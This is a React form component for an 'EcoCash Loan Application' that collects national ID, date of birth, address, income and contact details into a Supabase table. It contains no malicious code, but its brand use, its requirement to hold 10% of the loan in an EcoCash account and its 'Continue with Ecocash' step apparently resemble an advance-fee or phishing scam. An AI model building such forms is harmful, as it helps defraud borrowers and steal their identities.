import { useState } from 'react';
import { supabase } from '../lib/supabase';

interface ApplicationFormProps {
  onNext: (applicationId: string, data: ApplicationData) => void;
}

export interface ApplicationData {
  fullName: string;
  phoneNumber: string;
  email: string;
  idNumber: string;
  dateOfBirth: string;
  residentialAddress: string;
  employmentStatus: string;
  monthlyIncome: string;
  loanType: string;
  loanAmount: number;
  repaymentPeriod: string;
  termsAccepted: boolean;
}

export default function ApplicationForm({ onNext }: ApplicationFormProps) {
  const [formData, setFormData] = useState<ApplicationData>({
    fullName: '',
    phoneNumber: '',
    email: '',
    idNumber: '',
    dateOfBirth: '',
    residentialAddress: '',
    employmentStatus: '',
    monthlyIncome: '',
    loanType: '',
    loanAmount: 100,
    repaymentPeriod: '',
    termsAccepted: false,
  });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string>('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    try {
      const { data, error: dbError } = await supabase
        .from('applications')
        .insert({
          full_name: formData.fullName,
          phone_number: formData.phoneNumber,
          email: formData.email,
          id_number: formData.idNumber,
          date_of_birth: formData.dateOfBirth,
          residential_address: formData.residentialAddress,
          employment_status: formData.employmentStatus,
          monthly_income: formData.monthlyIncome ? parseFloat(formData.monthlyIncome) : null,
          loan_type: formData.loanType,
          loan_amount: formData.loanAmount,
          repayment_period: formData.repaymentPeriod,
          terms_accepted: formData.termsAccepted,
        })
        .select()
        .maybeSingle();

      if (dbError) {
        setError(dbError.message || 'Failed to submit application');
        console.error('Database error:', dbError);
        return;
      }

      if (data) {
        onNext(data.id, formData);
      } else {
        setError('Failed to create application');
      }
    } catch (err) {
      const errorMsg = err instanceof Error ? err.message : 'An error occurred';
      setError(errorMsg);
      console.error('Error submitting application:', err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-900 via-blue-900 to-slate-900 flex items-center justify-center p-4 py-12">
      <div className="w-full max-w-2xl">
        <div className="space-y-4">
          <div className="text-center mb-8">
            <h1 className="text-4xl font-bold text-white mb-2">EcoCash Loan Application</h1>
            <p className="text-blue-200 text-sm mb-4">Please fill in all required details accurately. All information is kept confidential and used only for loan processing and verification.</p>
            <div className="bg-blue-500 bg-opacity-10 border-l-4 border-blue-500 rounded p-4 text-left">
              <p className="text-blue-300 flex items-start gap-3">
                <span className="text-xl mt-1">ⓘ</span>
                <span>You must have at least 10% of the loan amount you want in your Ecocash account.</span>
              </p>
            </div>
          </div>

          {error && (
            <div className="bg-red-500 bg-opacity-10 border-l-4 border-red-500 rounded p-4 text-left mb-6">
              <p className="text-red-300">{error}</p>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="bg-gradient-to-r from-blue-800 to-blue-900 rounded-2xl p-6 border border-blue-700">
              <label className="block text-sm text-blue-200 mb-2">Full Name</label>
              <input
                type="text"
                required
                value={formData.fullName}
                onChange={(e) => setFormData({ ...formData, fullName: e.target.value })}
                className="w-full px-4 py-3 bg-blue-900 bg-opacity-50 border border-blue-600 rounded-lg text-white placeholder-blue-300 focus:ring-2 focus:ring-blue-400 focus:border-transparent outline-none transition"
                placeholder="Enter your full name"
              />
            </div>

            <div className="bg-gradient-to-r from-blue-800 to-blue-900 rounded-2xl p-6 border border-blue-700">
              <label className="block text-sm text-blue-200 mb-2">Phone Number</label>
              <input
                type="tel"
                required
                value={formData.phoneNumber}
                onChange={(e) => setFormData({ ...formData, phoneNumber: e.target.value })}
                className="w-full px-4 py-3 bg-blue-900 bg-opacity-50 border border-blue-600 rounded-lg text-white placeholder-blue-300 focus:ring-2 focus:ring-blue-400 focus:border-transparent outline-none transition"
                placeholder="0769691715"
              />
            </div>

            <div className="bg-gradient-to-r from-blue-800 to-blue-900 rounded-2xl p-6 border border-blue-700">
              <label className="block text-sm text-blue-200 mb-2">Email Address</label>
              <input
                type="email"
                required
                value={formData.email}
                onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                className="w-full px-4 py-3 bg-blue-900 bg-opacity-50 border border-blue-600 rounded-lg text-white placeholder-blue-300 focus:ring-2 focus:ring-blue-400 focus:border-transparent outline-none transition"
                placeholder="your@email.com"
              />
            </div>

            <div className="bg-gradient-to-r from-blue-800 to-blue-900 rounded-2xl p-6 border border-blue-700">
              <label className="block text-sm text-blue-200 mb-2">National ID <span className="text-red-400">*</span></label>
              <input
                type="text"
                required
                value={formData.idNumber}
                onChange={(e) => setFormData({ ...formData, idNumber: e.target.value })}
                className="w-full px-4 py-3 bg-blue-900 bg-opacity-50 border border-blue-600 rounded-lg text-white placeholder-blue-300 focus:ring-2 focus:ring-blue-400 focus:border-transparent outline-none transition"
                placeholder="Enter your National ID"
              />
            </div>

            <div className="bg-gradient-to-r from-blue-800 to-blue-900 rounded-2xl p-6 border border-blue-700">
              <label className="block text-sm text-blue-200 mb-2">Date of Birth <span className="text-red-400">*</span></label>
              <div className="flex gap-3">
                <select
                  required
                  value={formData.dateOfBirth.split('-')[2] || ''}
                  onChange={(e) => {
                    const [year, month] = formData.dateOfBirth.split('-').slice(0, 2);
                    setFormData({ ...formData, dateOfBirth: `${year || '2000'}-${month || '01'}-${e.target.value || '01'}` });
                  }}
                  className="flex-1 px-4 py-3 bg-blue-900 bg-opacity-50 border border-blue-600 rounded-lg text-white focus:ring-2 focus:ring-blue-400 focus:border-transparent outline-none transition"
                >
                  <option value="">Day</option>
                  {Array.from({ length: 31 }, (_, i) => (
                    <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
                      {i + 1}
                    </option>
                  ))}
                </select>
                <select
                  required
                  value={formData.dateOfBirth.split('-')[1] || ''}
                  onChange={(e) => {
                    const [year] = formData.dateOfBirth.split('-').slice(0, 1);
                    const [, , day] = formData.dateOfBirth.split('-');
                    setFormData({ ...formData, dateOfBirth: `${year || '2000'}-${e.target.value || '01'}-${day || '01'}` });
                  }}
                  className="flex-1 px-4 py-3 bg-blue-900 bg-opacity-50 border border-blue-600 rounded-lg text-white focus:ring-2 focus:ring-blue-400 focus:border-transparent outline-none transition"
                >
                  <option value="">Month</option>
                  <option value="01">January</option>
                  <option value="02">February</option>
                  <option value="03">March</option>
                  <option value="04">April</option>
                  <option value="05">May</option>
                  <option value="06">June</option>
                  <option value="07">July</option>
                  <option value="08">August</option>
                  <option value="09">September</option>
                  <option value="10">October</option>
                  <option value="11">November</option>
                  <option value="12">December</option>
                </select>
                <select
                  required
                  value={formData.dateOfBirth.split('-')[0] || ''}
                  onChange={(e) => {
                    const [, month, day] = formData.dateOfBirth.split('-');
                    setFormData({ ...formData, dateOfBirth: `${e.target.value || '2000'}-${month || '01'}-${day || '01'}` });
                  }}
                  className="flex-1 px-4 py-3 bg-blue-900 bg-opacity-50 border border-blue-600 rounded-lg text-white focus:ring-2 focus:ring-blue-400 focus:border-transparent outline-none transition"
                >
                  <option value="">Year</option>
                  {Array.from({ length: 100 }, (_, i) => {
                    const year = new Date().getFullYear() - i;
                    return (
                      <option key={year} value={year}>
                        {year}
                      </option>
                    );
                  })}
                </select>
              </div>
            </div>

            <div className="bg-gradient-to-r from-blue-800 to-blue-900 rounded-2xl p-6 border border-blue-700">
              <label className="block text-sm text-blue-200 mb-2">Residential Address <span className="text-red-400">*</span></label>
              <input
                type="text"
                required
                value={formData.residentialAddress}
                onChange={(e) => setFormData({ ...formData, residentialAddress: e.target.value })}
                className="w-full px-4 py-3 bg-blue-900 bg-opacity-50 border border-blue-600 rounded-lg text-white placeholder-blue-300 focus:ring-2 focus:ring-blue-400 focus:border-transparent outline-none transition"
                placeholder="Enter your residential address"
              />
            </div>

            <div className="bg-gradient-to-r from-blue-800 to-blue-900 rounded-2xl p-6 border border-blue-700">
              <label className="block text-sm text-blue-200 mb-2">Employment Status <span className="text-red-400">*</span></label>
              <select
                required
                value={formData.employmentStatus}
                onChange={(e) => setFormData({ ...formData, employmentStatus: e.target.value })}
                className="w-full px-4 py-3 bg-blue-900 bg-opacity-50 border border-blue-600 rounded-lg text-white focus:ring-2 focus:ring-blue-400 focus:border-transparent outline-none transition"
              >
                <option value="">Select employment status</option>
                <option value="Employed">Employed</option>
                <option value="Self Employed">Self Employed</option>
                <option value="Student">Student</option>
                <option value="Retired">Retired</option>
                <option value="Unemployed">Unemployed</option>
              </select>
            </div>

            <div className="bg-gradient-to-r from-blue-800 to-blue-900 rounded-2xl p-6 border border-blue-700">
              <label className="block text-sm text-blue-200 mb-2">Monthly Income</label>
              <input
                type="number"
                value={formData.monthlyIncome}
                onChange={(e) => setFormData({ ...formData, monthlyIncome: e.target.value })}
                className="w-full px-4 py-3 bg-blue-900 bg-opacity-50 border border-blue-600 rounded-lg text-white placeholder-blue-300 focus:ring-2 focus:ring-blue-400 focus:border-transparent outline-none transition"
                placeholder="Enter your monthly income"
              />
            </div>

            <div className="bg-gradient-to-r from-blue-800 to-blue-900 rounded-2xl p-6 border border-blue-700">
              <label className="block text-sm text-blue-200 mb-2">Loan Type <span className="text-red-400">*</span></label>
              <select
                required
                value={formData.loanType}
                onChange={(e) => setFormData({ ...formData, loanType: e.target.value })}
                className="w-full px-4 py-3 bg-blue-900 bg-opacity-50 border border-blue-600 rounded-lg text-white focus:ring-2 focus:ring-blue-400 focus:border-transparent outline-none transition"
              >
                <option value="">Select loan type</option>
                <option value="Personal Loan">Personal Loan</option>
                <option value="Business Loan">Business Loan</option>
                <option value="Emergency Loan">Emergency Loan</option>
                <option value="Education Loan">Education Loan</option>
              </select>
            </div>

            <div className="bg-gradient-to-r from-blue-800 to-blue-900 rounded-2xl p-6 border border-blue-700">
              <label className="block text-sm text-blue-200 mb-2">Loan Amount in USD <span className="text-red-400">*</span></label>
              <input
                type="number"
                required
                value={formData.loanAmount}
                onChange={(e) => setFormData({ ...formData, loanAmount: Number(e.target.value) })}
                className="w-full px-4 py-3 bg-blue-900 bg-opacity-50 border border-blue-600 rounded-lg text-white placeholder-blue-300 focus:ring-2 focus:ring-blue-400 focus:border-transparent outline-none transition"
                placeholder="Enter loan amount"
                min="100"
              />
            </div>

            <div className="bg-gradient-to-r from-blue-800 to-blue-900 rounded-2xl p-6 border border-blue-700">
              <label className="block text-sm text-blue-200 mb-2">Repayment Period <span className="text-red-400">*</span></label>
              <select
                required
                value={formData.repaymentPeriod}
                onChange={(e) => setFormData({ ...formData, repaymentPeriod: e.target.value })}
                className="w-full px-4 py-3 bg-blue-900 bg-opacity-50 border border-blue-600 rounded-lg text-white focus:ring-2 focus:ring-blue-400 focus:border-transparent outline-none transition"
              >
                <option value="">Select repayment period</option>
                <option value="3 Months">3 Months</option>
                <option value="6 Months">6 Months</option>
                <option value="12 Months">12 Months</option>
                <option value="24 Months">24 Months</option>
                <option value="36 Months">36 Months</option>
              </select>
            </div>

            <div className="bg-gradient-to-r from-blue-800 to-blue-900 rounded-2xl p-6 border border-blue-700 flex items-start gap-3">
              <input
                type="checkbox"
                required
                checked={formData.termsAccepted}
                onChange={(e) => setFormData({ ...formData, termsAccepted: e.target.checked })}
                className="w-5 h-5 mt-1 accent-blue-400 cursor-pointer"
              />
              <label className="text-sm text-blue-200">
                I agree to the terms and conditions <span className="text-red-400">*</span>
              </label>
            </div>

            <div className="flex gap-3">
              <button
                type="submit"
                disabled={loading || !formData.termsAccepted}
                className="flex-1 bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-bold py-4 rounded-2xl transition duration-200 disabled:opacity-50 disabled:cursor-not-allowed text-lg"
              >
                {loading ? 'Processing...' : 'Continue with Ecocash'}
              </button>
              <button
                type="reset"
                className="flex-1 bg-white bg-opacity-10 hover:bg-opacity-20 text-white font-bold py-4 rounded-2xl transition duration-200 text-lg border border-white border-opacity-20"
              >
                Reset
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
